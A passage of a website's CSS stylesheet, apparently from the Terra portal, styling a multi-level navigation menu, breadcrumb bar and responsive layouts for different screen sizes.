			margin-right: 30px;
			margin-top: 0
		}

		.trr-menu .trr-section-footer .linear,
		.trr-menu .trr-section-title .linear {
			background: -webkit-radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%);
			background: -moz-radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%);
			background: -o-radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%);
			background: -ms-radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%);
			background: radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%);
			height: 2px;
			margin-top: 10px;
			margin-bottom: 10px;
			text-align: center;
			clear: right
		}

		.trr-menu span.trr-section-footer,
		.trr-menu span.trr-section-header {
			font: 11px OpenSans, sans-serif;
			color: #65655D;
			text-transform: uppercase;
			margin-bottom: 10px;
			display: block;
			margin-left: 10px
		}

		.trr-menu div.trr-section-content {
			height: 100%
		}

		.trr-menu-linear {
			display: none;
			height: 2px;
			margin: 10px auto 10px -6px;
			text-align: center;
			background: -webkit-radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%);
			background: -moz-radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%);
			background: -ms-radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%);
			background: -o-radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%);
			background: radial-gradient(center bottom, ellipse farthest-side, rgba(0, 0, 0, .2), transparent 100%)
		}

		html[data-range=large] .trr-menu-linear,
		html[data-range=medium] .trr-menu-linear,
		html[data-range=xlarge] .trr-menu-linear {
			display: list-item
		}

		.trr-menu li.menu-item {
			min-height: 30px;
			font: 14px OpenSans, sans-serif;
			border-radius: 4px 0 0 4px;
			font-weight: 600;
			display: table;
			width: 100%
		}

		.trr-menu li.menu-item.is-module {
			height: auto;
			margin-bottom: 10px;
			margin-left: -10px;
			width: 250px;
			top: -20px;
			transition: all .2s ease-in-out;
			-o-transition: all .2s ease-in-out;
			-moz-transition: all .2s ease-in-out;
			-webkit-transition: all .2s ease-in-out
		}

		.trr-menu .services li.menu-item,
		.trr-menu li.menu-item.is-final {
			border-radius: 4px;
			width: 95%
		}

		.trr-menu li.menu-item.is-module a {
			font-size: 14px;
			display: inline-block;
			font-weight: 400;
			text-decoration: none
		}

		.trr-menu li.menu-item.is-module a.is-disabled {
			color: #65655d
		}

		.app-teams__content__list {
			display: none !important;
			position: absolute !important
		}

		.app-teams__content__list.is-active,
		.app-teams__content__list.is-active .app-teams__page.is-active {
			display: block !important;
			position: relative !important
		}

		.not-tab .trr-menu li.menu-item.is-module li,
		.not-tab .trr-menu li.menu-item.is-module li:hover {
			border: none !important;
			background: none !important
		}

		.trr-menu .menu-item a {
			color: #33332E;
			text-decoration: none;
			display: block;
			padding-left: 3px;
			padding-top: 6px;
			padding-bottom: 5px
		}

		.trr-menu li.menu-item {
			border-left: 2px solid transparent
		}

		.not-tab .trr-menu li.menu-item:hover,
		.trr-menu li.menu-item.active {
			background-color: #F1F1F1;
			border-left: 2px solid #A5A598
		}

		.trr-menu li.menu-item a .followicon {
			display: none
		}

		.trr-menu li.menu-item.active>a .followicon {
			background-image: url("https://s1.trrsf.com/update-1542656194/fe/zaz-app-menu-navbar/_img/menu-backtrack-icon.png");
			background-repeat: no-repeat;
			width: 11px;
			height: 21px;
			display: block;
			position: absolute;
			right: 1px;
			z-index: 10;
			margin-top: -2px
		}

		.trr-menu .level-1 li.menu-item.active>a .followicon {
			right: -1px
		}

		.not-tab .trr-menu li.menu-item.sports li:hover,
		.not-tab .trr-menu li.menu-item.sports:hover,
		.trr-menu li.menu-item.sports.active,
		.trr-menu li.menu-item.sports.active li.active {
			background-color: #E5F4F3;
			border-left: 2px solid #00958C
		}

		.not-tab .trr-menu li.menu-item.fun li:hover,
		.not-tab .trr-menu li.menu-item.fun:hover,
		.trr-menu li.menu-item.fun.active,
		.trr-menu li.menu-item.fun.active li.active {
			background-color: #F7ECF6;
			border-left: 2px solid #B040A2
		}

		.not-tab .trr-menu li.menu-item.news li:hover,
		.not-tab .trr-menu li.menu-item.news:hover,
		.trr-menu li.menu-item.news.active,
		.trr-menu li.menu-item.news.active li.active {
			background-color: #F9E8E6;
			border-left: 2px solid #C11C05
		}

		.not-tab .trr-menu li.menu-item.svas li:hover,
		.not-tab .trr-menu li.menu-item.svas:hover,
		.trr-menu li.menu-item.svas.active,
		.trr-menu li.menu-item.svas.active li.active {
			background-color: #FFFAE8;
			border-left: 2px solid #FFCE1E
		}

		.not-tab .trr-menu li.menu-item.is-module:hover,
		.trr-menu li.menu-item.is-module.active {
			background-color: transparent !important;
			border-left: 2px solid transparent !important
		}

		.not-tab .trr-menu .services li.menu-item:hover {
			background-color: #FFFAE8;
			border-left: 2px solid #FFCE1E
		}

		.trr-menu .trr-menu-levels {
			position: relative;
			margin-bottom: 10px;
			width: 200px;
			float: left;
			border-right: 1px solid #D7D7D7;
			padding-bottom: 140px
		}

		.trr-menu .trr-menu-items.level-1,
		.trr-menu .trr-menu-items.level-2,
		.trr-menu .trr-menu-items.level-3,
		.trr-menu .trr-menu-items.level-4 {
			position: absolute;
			top: 0;
			left: 198px;
			display: none
		}

		.trr-menu .trr-menu-levels ul.trr-menu-items {
			width: 200px;
			background-color: #fff;
			border-right: 1px solid #D7D7D7;
			border-left: 1px solid #D7D7D7;
			transition: all .2s ease-in-out;
			-o-transition: all .2s ease-in-out;
			-moz-transition: all .2s ease-in-out;
			-webkit-transition: all .2s ease-in-out;
			z-index: 0;
			padding-left: 5px
		}

		.trr-menu .trr-menu-levels ul.trr-menu-items.level-0 {
			border-right: none
		}

		.trr-menu .trr-menu-levels .icon-arrow {
			float: right;
			margin-right: 10px
		}

		.trr-menu .trr-menu-levels .trr-label {
			float: left;
			max-width: 160px;
			color: #65656a
		}

		.trr-menu .trr-menu-levels a.link {
			float: left;
			width: 100%
		}

		.trr-menu li.menu-item.is-father.active .backtrack {
			background-image: url("https://s1.trrsf.com/update-1542656194/fe/zaz-app-menu-navbar/_img/menu-backtrack-icon.png");
			width: 11px;
			height: 20px;
			position: relative;
			right: -183px;
			display: block;
			top: 3px
		}

		.trr-menu .trr-menu-services {
			float: right;
			border-left: 1px solid #D7D7D7
		}

		.ds .trr-burgernav.open {
			width: 300px
		}

		html[data-range=small] .ds .trr-burgernav.open {
			width: 100%
		}

		.trr-menu-footer {
			clear: both;
			width: 100%;
			display: block;
			position: fixed;
			border-top: 1px solid #d7d7d7;
			padding-top: 15px;
			overflow: hidden;
			background-color: #FFF;
			bottom: 0;
			z-index: 11
		}

		.trr-menu-footer .menu-item-inline {
			display: block;
			float: left;
			margin-bottom: 10px
		}

		.trr-menu-footer li {
			float: left
		}

		.trr-menu-footer .menu-item-inline .country-title {
			font: 14px OpenSans, sans-serif;
			color: #65655D;
			text-transform: uppercase;
			margin-bottom: 10px;
			display: block;
			margin-left: 5px;
			width: 95px;
			text-align: right;
			float: left;
			line-height: 14px
		}

		.trr-menu-footer .menu-item-inline .menu-item-country {
			float: left;
			margin-left: 10px
		}

		.trr-menu-footer .menu-item-inline .icon-country {
			display: block
		}

		.trr-menu .trr-menu-services .trr-section-title p {
			margin-top: -4px
		}

		.trr-menu .trr-menu-services .trr-section-footer a {
			margin-bottom: 10px;
			margin-top: 5px
		}

		.trr-menu .trr-menu-levels ul.trr-menu-items.active {
			z-index: 1;
			display: block
		}

		.trr-menu .smartclick {
			display: none;
			height: 100%;
			width: 50px;
			position: absolute;
			left: -50px;
			cursor: pointer
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-1 {
			left: 50px
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-1 .smartclick {
			display: block
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-0 .followicon,
		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-2 .smartclick,
		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-3 .smartclick,
		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-4 .smartclick {
			display: none
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-1 .followicon,
		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-2 .followicon,
		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-3 .followicon,
		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-4 .followicon {
			display: block
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-1,
		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-2 {
			left: 50px
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-1 .smartclick,
		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-2 .smartclick {
			display: block
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-0 .followicon,
		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-1 .followicon,
		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-3 .smartclick {
			display: none
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-2 .followicon,
		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-3 .followicon,
		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-4 .followicon {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .trr-menu-items.level-1 {
			left: 40px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .trr-menu-items.level-1 .smartclick {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .level-0 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .trr-menu-items.level-2 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .trr-menu-items.level-3 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .trr-menu-items.level-4 .smartclick {
			display: none
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .level-1 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .level-2 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .level-3 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2] .level-4 .followicon {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .trr-menu-items.level-1,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .trr-menu-items.level-2 {
			left: 40px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .trr-menu-items.level-1 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .trr-menu-items.level-2 .smartclick {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .level-0 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .level-1 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .trr-menu-items.level-3 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .trr-menu-items.level-4 .smartclick {
			display: none
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .level-2 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .level-3 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3] .level-4 .followicon {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .trr-menu-items.level-1,
		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .trr-menu-items.level-2,
		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .trr-menu-items.level-3 {
			left: 40px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .trr-menu-items.level-1 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .trr-menu-items.level-2 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .trr-menu-items.level-3 .smartclick {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .level-0 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .level-1 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .level-2 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .trr-menu-items.level-4 .smartclick {
			display: none
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .level-3 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-4] .level-4 .followicon {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .trr-menu-items.level-1 {
			left: 40px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .trr-menu-items.level-1 .smartclick {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .level-0 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .trr-menu-items.level-2 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .trr-menu-items.level-3 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .trr-menu-items.level-4 .smartclick {
			display: none
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .level-1 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .level-2 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .level-3 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] .level-4 .followicon {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-1,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-2 {
			left: 40px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-1 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-2 .smartclick {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-0 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-1 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-3 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .trr-menu-items.level-4 .smartclick {
			display: none
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-2 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-3 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] .level-4 .followicon {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-1,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-2,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-3 {
			left: 40px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-1 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-2 .smartclick,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-3 .smartclick {
			display: block
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-0 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-1 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-2 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .trr-menu-items.level-4 .smartclick {
			display: none
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-3 .followicon,
		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] .level-4 .followicon {
			display: block
		}

		.trr-globalnav .slim .trr-burgernav {
			top: 42px
		}

		.trr-globalnav .slim .trr-burgernav.open {
			padding: 0;
			top: 42px
		}

		.trr-globalnav .trr-burgernav .trr-section-title a:hover {
			opacity: .7
		}

		#nav-breadcrumb {
			display: block;
			height: 40px;
			width: 100%;
			background-color: #C3570F;
			margin-top: 60px;
			transition: all .2s ease-in-out;
			-o-transition: all .2s ease-in-out;
			-moz-transition: all .2s ease-in-out;
			-webkit-transition: all .2s ease-in-out
		}

		.slim #nav-breadcrumb {
			margin-top: 42px
		}

		#nav-breadcrumb li {
			display: inline-block;
			margin-top: 12px;
			background-image: url("https://s1.trrsf.com/update-1542656194/fe/zaz-app-menu-navbar/_img/breadcrumb-sibbling.png");
			background-repeat: no-repeat;
			background-position: right center;
			padding-right: 26px;
			margin-left: 20px;
			
		}

		#nav-breadcrumb li:last-child {
			background: 0 0
		}

		#nav-breadcrumb li:first-child {
			margin-left: 10px
		}

		#nav-breadcrumb li a {
			text-decoration: none;
			text-transform: lowercase;
			color: #fff;
			font-size: 14px
		}

		#nav-breadcrumb li a:hover {
			opacity: .7
		}

		.trr-globalnav-seo,
		html[data-device-type=mob] #nav-breadcrumb {
			display: none
		}

		#trr-globalnav {
			overflow: hidden;
			display: none
		}

		#trr-menu {
			padding-top: 15px;
			overflow-x: hidden;
			border-right: 1px solid #D7D7D7
		}

		.trr-menu-services .icon-follow {
			position: relative;
			top: 5px
		}

		html[data-range=xlarge] li.menu-item.is-module {
			margin-left: 195px
		}

		.trr-menu-levels {
			-ms-box-sizing: content-box;
			box-sizing: content-box
		}

		.trr-menu .trr-menu-services {
			padding-bottom: 140px
		}

		.trr-menu .services li.menu-item {
			padding-left: 10px
		}

		html[data-range=small] .trr-menu .trr-menu-services,
		html[data-range=xsmall] .trr-menu .trr-menu-services {
			padding-bottom: 10px
		}

		#trr-globalnav {
			position: absolute;
			top: 0;
			padding-top: 40px;
			width: 100%;
			z-index: 9999;
			background-color: #fff
		}

		.trr-menu .trr-section-footer {
			position: relative;
			top: 5px
		}

		#trr-ctn-general {
			overflow: hidden
		}

		#searchcontent,
		#trr-burgernav,
		#trr-globalburger,
		#trr-menu,
		#trr-navcontent {
			height: 100%;
			overflow-y: auto
		}

		.trr-menu .trr-menu-levels ul.trr-menu-items {
			min-height: 100%;
			height: auto
		}

		html[data-range=small] #searchcontent,
		html[data-range=small] #trr-burgernav,
		html[data-range=small] #trr-globalburger,
		html[data-range=small] #trr-globalnav,
		html[data-range=small] #trr-menu,
		html[data-range=small] #trr-navcontent,
		html[data-range=xsmall] #searchcontent,
		html[data-range=xsmall] #trr-burgernav,
		html[data-range=xsmall] #trr-globalburger,
		html[data-range=xsmall] #trr-globalnav,
		html[data-range=xsmall] #trr-menu,
		html[data-range=xsmall] #trr-navcontent {
			height: auto !important
		}

		.trr-menu .trr-menu-services {
			width: 195px
		}

		html[data-range=small] .trr-menu-footer,
		html[data-range=small] .trr-menu-list,
		html[data-range=small] .trr-menu-services {
			width: 321px !important
		}

		html[data-range=xlarge] .trr-menu li.menu-item.is-module {
			position: absolute;
			border: 1px solid transparent !important;
			padding: 10px;
			border-radius: 6px;
			z-index: 5
		}

		html[data-range=xlarge] .trr-menu li.menu-item.is-module:hover {
			border: 1px solid transparent !important
		}

		html[data-range=xlarge] .trr-menu #leveltracker[index=level-1] li.menu-item.is-module {
			margin-left: 195px
		}

		html[data-range=xlarge] .trr-menu #leveltracker[index=level-2] li.menu-item.is-module {
			margin-left: 395px
		}

		html[data-range=xlarge] .trr-menu #leveltracker[index=level-3] li.menu-item.is-module {
			margin-left: 595px
		}

		html[data-range=large] .trr-menu li.menu-item.is-module {
			position: absolute;
			border: 1px solid transparent !important;
			padding: 10px;
			border-radius: 6px;
			z-index: 5
		}

		html[data-range=large] .trr-menu li.menu-item.is-module:hover {
			border: 1px solid transparent !important
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-1] li.menu-item.is-module {
			margin-left: 195px
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-2] li.menu-item.is-module {
			margin-left: 385px
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-3] li.menu-item.is-module {
			margin-left: 445px
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-1][indextype=sports] li.menu-item.is-module {
			margin-left: 195px
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-2][indextype=sports] li.menu-item.is-module {
			margin-left: 385px
		}

		html[data-range=large] .trr-menu #leveltracker[index=level-3][indextype=sports] li.menu-item.is-module {
			margin-left: 445px
		}

		html[data-range=medium] .trr-menu li.menu-item.is-module {
			position: absolute;
			border: 1px solid transparent !important;
			padding: 10px;
			border-radius: 6px;
			z-index: 5
		}

		html[data-range=medium] .trr-menu li.menu-item.is-module:hover {
			border: 1px solid transparent !important
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-1] li.menu-item.is-module {
			margin-left: 195px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2] li.menu-item.is-module {
			margin-left: 395px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3] li.menu-item.is-module {
			margin-left: 445px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-1][indextype=sports] li.menu-item.is-module {
			margin-left: 195px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-2][indextype=sports] li.menu-item.is-module {
			margin-left: 240px
		}

		html[data-range=medium] .trr-menu #leveltracker[index=level-3][indextype=sports] li.menu-item.is-module {
			margin-left: 275px
		}

		@media only screen and (max-width:767px) {
			.trr-menu li.menu-item.active a>.followicon {
				display: none
			}

			.trr-menu .menu-item a {
				padding-top: 10px;
				padding-bottom: 10px
			}

			.trr-menu .menu-item .level-1 a {
				padding-top: 5px
			}

			.trr-menu .level-0 .trr-section-title {
				margin-top: 40px
			}

			.trr-menu-services .trr-section-title {
				margin-top: 20px
			}

			.trr-menu-footer .menu-item-inline {
				margin-top: 5px
			}

			.trr-menu li.menu-item {
				min-height: 40px;
				border-bottom: 1px solid #e2e2e2
			}

			.trr-menu .trr-menu-services li.menu-item,
			.trr-menu li.menu-item:last-child {
				border-bottom: none
			}

			.trr-menu li.menu-item.is-module {
				margin-left: 0;
				margin-bottom: 0;
				width: 100%
			}

			.trr-menu li.menu-item.is-module .module {
				margin-bottom: 10px;
				margin-top: -10px
			}

			.trr-globalnav .trr-burgernav a:hover {
				opacity: 1
			}

			.trr-globalnav .slim .trr-globalburger {
				top: 2px;
				z-index: 115
			}

			.trr-globalnav .trr-burgernav {
				top: 40px
			}

			.trr-globalnav .slim .trr-burgernav.open {
				padding: 0;
				width: 320px;
				top: 40px
			}

			.trr-menu .trr-menu-levels {
				width: 320px;
				clear: left;
				position: initial
			}

			.trr-globalnav .trr-burgernav .trr-menu-list .trr-menu-services {
				width: 310px;
				clear: right;
				border: none
			}

			.trr-globalnav .trr-burgernav .trr-menu-list .trr-menu-footer {
				width: 310px;
				margin-left: 10px
			}

			.trr-menu .trr-menu-levels ul.trr-menu-items {
				width: 290px;
				border: none
			}

			.trr-menu .trr-menu-levels ul.trr-menu-items li.active {
				border-bottom: 2px solid #A5A598
			}

			.trr-menu .trr-menu-levels ul.trr-menu-items li.active.sports,
			.trr-menu .trr-menu-levels ul.trr-menu-items li.active.sports li.active {
				border-bottom: 2px solid #00958C
			}

			.trr-menu .trr-menu-levels ul.trr-menu-items li.active.news,
			.trr-menu .trr-menu-levels ul.trr-menu-items li.active.news li.active {
				border-bottom: 2px solid #C11C05
			}

			.trr-menu .trr-menu-levels ul.trr-menu-items li.active.fun,
			.trr-menu .trr-menu-levels ul.trr-menu-items li.active.fun li.active {
				border-bottom: 2px solid #B040A2
			}

			.trr-menu .trr-menu-levels ul.trr-menu-items li.active.svas,
			.trr-menu .trr-menu-levels ul.trr-menu-items li.active.svas li.active {
				border-bottom: 2px solid #FFCE1E
			}

			.trr-menu .trr-menu-levels ul.trr-menu-items li.active.sports li.app-teams__team.active {
				border: none
			}

			.trr-menu .trr-menu-levels ul.trr-menu-items.level-0 {
				width: 305px;
				margin-left: 3px
			}

			.trr-menu li.menu-item.is-father.active .backtrack {
				display: none
			}

			.trr-menu .trr-menu-items.level-1,
			.trr-menu .trr-menu-items.level-2,
			.trr-menu .trr-menu-items.level-3,
			.trr-menu .trr-menu-items.level-4 {
				position: initial;
				display: none;
				-webkit-box-shadow: none;
				-moz-box-shadow: none;
				box-shadow: none
			}

			.trr-menu .trr-menu-levels .icon-arrow {
				margin-right: 10px;
				margin-top: 5px
			}

			.trr-menu li.menu-item.active,
			.trr-menu li.menu-item.fun li:hover,
			.trr-menu li.menu-item.fun.active,
			.trr-menu li.menu-item.fun.active li.active,
			.trr-menu li.menu-item.fun:hover,
			.trr-menu li.menu-item.news li:hover,
			.trr-menu li.menu-item.news.active,
			.trr-menu li.menu-item.news.active li.active,
			.trr-menu li.menu-item.news:hover,
			.trr-menu li.menu-item.sports li:hover,
			.trr-menu li.menu-item.sports.active,
			.trr-menu li.menu-item.sports.active li.active,
			.trr-menu li.menu-item.sports:hover,
			.trr-menu li.menu-item.svas li:hover,
			.trr-menu li.menu-item.svas.active,
			.trr-menu li.menu-item.svas.active li.active,
			.trr-menu li.menu-item.svas:hover,
			.trr-menu li.menu-item:hover {
				background-color: transparent;
				border-left: 2px solid transparent
			}

			.trr-globalnav .trr-burgernav .trr-menu-list .menu-item a {
				border-left: 2px solid transparent;
				border-radius: 4px;
				cursor: pointer
			}

			.trr-globalnav .trr-burgernav .trr-menu-list .menu-item.active a {
				padding-left: 3px;
				margin-right: 0;
				margin-bottom: 0
			}

			.trr-globalnav .trr-burgernav .trr-menu-list .menu-item.active a.app-teams__button {
				margin-right: -.5rem
			}

			.trr-menu li.menu-item.active>a {
				background-color: #F1F1F1;
				border-left: 2px solid #A5A598 !important
			}

			.trr-menu li.menu-item.sports.active li.active>a,
			.trr-menu li.menu-item.sports.active>a {
				background-color: #E5F4F3;
				border-left: 2px solid #00958C !important
			}

			.trr-menu li.menu-item.fun.active li.active>a,
			.trr-menu li.menu-item.fun.active>a {
				background-color: #F7ECF6;
				border-left: 2px solid #B040A2 !important
			}

			.trr-menu li.menu-item.news.active li.active>a,
			.trr-menu li.menu-item.news.active>a {
				background-color: #F9E8E6;
				border-left: 2px solid #C11C05 !important
			}

			.trr-menu li.menu-item.svas.active li.active>a,
			.trr-menu li.menu-item.svas.active>a {
				background-color: #FFFAE8;
				border-left: 2px solid #FFCE1E !important
			}

			.trr-menu li.menu-item.sports.active li.app-teams__team.active>a,
			.trr-menu li.menu-item.sports.active>a {
				background-color: transparent;
				border: none !important
			}

			.trr-globalnav .trr-burgernav .trr-menu-list .menu-item .module .app-teams__header__item a {
				border: 1px solid #d7d7d7 !important;
				padding-top: 5px
			}

			.trr-globalnav .trr-burgernav .trr-menu-list .menu-item .module .app-teams__header__item.active,
			.trr-globalnav .trr-burgernav .trr-menu-list .menu-item .module .app-teams__header__item.active a {
				background-color: #FFF;
				border: none
			}

			.trr-globalnav .trr-burgernav .trr-menu-list .menu-item .module .app-teams__header__item.active a.is-disabled {
				background-color: #f1f1f1
			}

			.trr-menu .trr-menu-levels .level-1 .trr-label,
			.trr-menu .trr-menu-levels .level-2 .trr-label,
			.trr-menu .trr-menu-levels .level-3 .trr-label,
			.trr-menu .trr-menu-levels .level-4 .trr-label {
				font-size: 12px;
				line-height: 12px
			}

			.trr-menu .services li.menu-item {
				width: 45%;
				float: left;
				padding-left: 5px
			}

			.trr-section-footer {
				float: left
			}

			.trr-navcontent.slim.mainmenu-open .trr-logotipia {
				left: 80%
			}

			.trr-navcontent.slim.mainmenu-open .trr-profilearea {
				display: none
			}

			.trr-menu-services .trr-section-title a {
				margin-bottom: 15px
			}

			.trr-menu .trr-menu-services .trr-section-footer a {
				margin-bottom: 15px;
				margin-top: 15px
			}

			.trr-menu li.menu-item.is-final {
				width: 100%;
				border-radius: inherit
			}

			.trr-globalnav .trr-globalburger .trr-search form {
				padding-top: 4px
			}

			.trr-globalnav .trr-globalburger .burger .icon-burger {
				margin-top: 7px
			}

			.trr-menu li.menu-item.active {
				display: inline-block
			}

			.trr-menu .trr-menu-footer .trr-section-title .icon-follow {
				margin-right: 10px
			}

			.trr-menu-footer .menu-item-inline .country-title {
				width: 100%;
				text-align: left;
				margin-bottom: 5px
			}

			.trr-menu-services .trr-section-footer.trr-section-title {
				margin-top: 0
			}

			.trr-menu .level-0>li.menu-item:last-child {
				border-bottom: 1px solid #D7D7D7
			}

			.trr-globalnav .trr-globalburger .burger .burger-label:hover {
				opacity: 1
			}

			.trr-menu .trr-section-title .icon-follow {
				margin-top: -4px
			}

			.trr-menu ul.trr-menu-items.level-2.active {
				width: 280px
			}

			.trr-menu ul.trr-menu-items.level-3.active {
				width: 270px
			}

			.trr-menu ul.trr-menu-items.level-4.active {
				width: 260px
			}

			.trr-globalnav .trr-globalburger {
				width: 40px
			}

			.trr-globalnav .trr-globalburger.db {
				width: 100%
			}

			.trr-globalnav .slim.mainmenu-open .db .burger .arrow {
				top: 35px
			}

			.trr-menu-footer {
				position: relative
			}

			.trr-menu li.menu-item {
				font-weight: 400
			}
		}

		@media (max-width:767px) {
			.trr-menu li.menu-item.sports.active li.app-teams__header__item.active {
				border-left: none
			}

